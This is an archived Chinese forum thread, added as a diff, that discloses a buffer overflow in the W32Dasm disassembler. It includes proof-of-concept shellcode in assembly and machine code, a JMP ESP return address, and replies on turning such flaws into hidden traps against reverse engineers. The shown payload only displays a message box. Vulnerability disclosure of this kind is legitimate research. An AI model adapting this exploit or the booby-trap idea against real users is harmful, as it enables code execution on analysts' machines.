@@ -1,0 +1,145 @@
+
+# W32Dasm 存在溢出
+
+> 原文：[`www.pediy.com/kssd/pediy07/pediy7-27.htm`](https://www.pediy.com/kssd/pediy07/pediy7-27.htm)
+
+`W32Dasm` 使用 `wprintf()` 函数拷贝分析文件的引入/导出函数名到一个 256 字节的缓冲区，超长导入/输出函数名可发生缓冲区溢出，精心构建一个恶意可执行文件，诱使用户调试，可以进程权限在系统上执行任意指令。
+
+附件是测试程序
+
+用 `W32Dasm` 载入测试后部分系统会弹出 `MessageBox` 对话框
+
+标题 `Success` 内容 `We Got It!`
+
+由于 `Windows XP SP2` 有溢出保护机制不会弹出对话框但会令 `W32Dasm` 崩溃
+
+该漏洞危害很大可能被软件编写者用来设置暗桩。
+
+附件:`EXP.rar`
+
+对话框汇编代码
+
+```
+代码:
+
+* * *
+
+push        ebp 
+push        ecx 
+mov        ebp,esp 
+sub         esp,54h 
+xor          ecx,ecx 
+mov         byte ptr [ebp-14h],'S' 
+mov         byte ptr [ebp-13h],'u' 
+mov         byte ptr [ebp-12h],'c' 
+mov         byte ptr [ebp-11h],'c' 
+mov         byte ptr [ebp-10h],'e' 
+mov         byte ptr [ebp-0Fh],'s' 
+mov         byte ptr [ebp-0Eh],'s' 
+mov         byte ptr [ebp-0Dh],cl 
+mov         byte ptr [ebp-0Ch],'W' 
+mov         byte ptr [ebp-0Bh],'e' 
+mov         byte ptr [ebp-0Ah],'  ' 
+mov         byte ptr [ebp-9],'G' 
+mov         byte ptr [ebp-8],'o' 
+mov         byte ptr [ebp-7],'t' 
+mov         byte ptr [ebp-6],'  ' 
+mov         byte ptr [ebp-5],'I' 
+mov         byte ptr [ebp-4],'t' 
+mov         byte ptr [ebp-3],'!' 
+mov         byte ptr [ebp-2],cl 
+push        ecx 
+lea          eax,[ebp-14h] 
+push       eax 
+lea          eax,[ebp-0Ch] 
+push       eax 
+push       ecx 
+mov       dword ptr [ebp-18h],0x 77D4F90B//User32.dll 起始地址 77d10000+ MessageBoxA 偏移量 0003F90B=77D4F90B
+call        dword ptr[ebp-18h] 
+mov      esp,ebp 
+pop      ecx
+pop      ebp
+push        ebp 
+push        ecx 
+mov        ebp,esp 
+sub         esp,10h 
+xor         ecx,ecx 
+push       ecx 
+mov       dword ptr [ebp-4],0x1020AF90 
+call        dword ptr[ebp-4]  //以上代码以 0 为参数调用 exit 函数，使应用程序以代码 0 退出运行
+mov       esp,ebp 
+pop       ecx 
+pop       ebp
+
+* * *
+
+
+```
+
+转换为机器码为
+
+`\\x55\\x51\\x8b\\xec\\x83\\xec\\x54\\x33\\xc9\\xc6\\x45\\xec\\x53\\xc6\\x45\\xed\\x75\\xc6\\x45\\xee\\x63\\xc6\\x45\\xef\\x63\\xc6\\x45\\xf0\\x65\\xc6\\x45\\xf1\\x73\\xc6\\x45\\xf2\\x73\\x88\\x4d\\xf3\\xc6\\x45\\xf4\\x57\\xc6\\x45\\xf5\\x65\\xc6\\x45\\xf6\\x20\\xc6\\x45\\xf7\\x47\\xc6\\x45\\xf8\\x6f\\xc6\\x45\\xf9\\x74\\xc6\\x45\\xfa\\x20\\xc6\\x45\\xfb\\x49\\xc6\\x45\\xfc\\x74\\xc6\\x45\\xfd\\x21\\x88\\x4d\\xfe\\x51\\x8d\\x45\\xec\\x50\\x8d\\x45\\xf4\\x50\\x51\\xc7\\x45\\xe8\\x0B\\xF9\\xD4\\x77\\xff\\x55\\xe8\\x8b\\xe5\\x59\\x5d\\x55\\x51\\x8b\\xec\\x83\\xec\\x10\\x33\\xc9\\x51\\xc7\\x45\\xfc\\x90\\xaf\\x20\\x10\\xff\\x55\\xfc\\x8b\\xe5\\x59\\x5d`
+
+程序用一个 `JMP ESP`// `\\x12\\x45\\xfa\\x7f`
+
+`2000 SP4`
+
+`W32DASM` 崩溃
+
+问题是：直接运行程序会说找不到 dll。那么，有很大价值吗？
+
+不过这个思路很好。利用反汇编软件或调试软件的漏洞实现反静态分析甚至反 Debug
+
+顺便说一句，我要是改你的 import 不就完了？
+
+任何存在的漏洞都是有意义的
+
+不一定是一个程序
+
+或者是一个 dll 中的某一个导入、输出函数
+
+我主程序加载的时候可以使用动态的方式
+
+你当然可以改我的导入、输出表但是在分析这个程序之前你知道他里面有暗桩吗
+
+有可能你在死机和重起甚至被格式化之后才知道吧
+
+或者有办法用 `SMC` 的方法动态修改导入输出函数呢？
+
+![](img/710b5589904d0d2bf58a67748fca40e1.jpg) `Ida` 也有漏洞，但是作者马上就出了个 `path`
+
+所以利用缓冲区漏洞来 anti
+
+并不是很成熟~
+
+![](img/1a550ccb7245757838a4f08fc220b787.jpg) 除非只有你发现，但是专门来研究一个工具的漏洞工作量也不小
+
+> 引用:
+
+> * * *
+
+> *最初由 WiNrOOt 发布*
+
+> **![](img/710b5589904d0d2bf58a67748fca40e1.jpg) Ida 也有漏洞，但是作者马上就出了个 path**
+
+> **所以利用缓冲区漏洞来 anti**
+
+> **并不是很成熟~**
+
+> **![](img/1a550ccb7245757838a4f08fc220b787.jpg) 除非只有你发现，但是专门来研究一个工具的漏洞工作量也不小**
+
+> * * *
+
+呵呵
+
+话是这么说
+
+不过 `W32Dasm` 已经好久不更新了吧？
+
+换句话说你现在找有漏洞的 `windows 2000` 还不是遍地都是
+
+虽然意义不大对于新手来说
+
+反汇编人家软件的时候突然跳出一个格式化的窗口也够下一跳的吧？
+
+`4dd466d0e1e0cc123afbe504da2462ca`
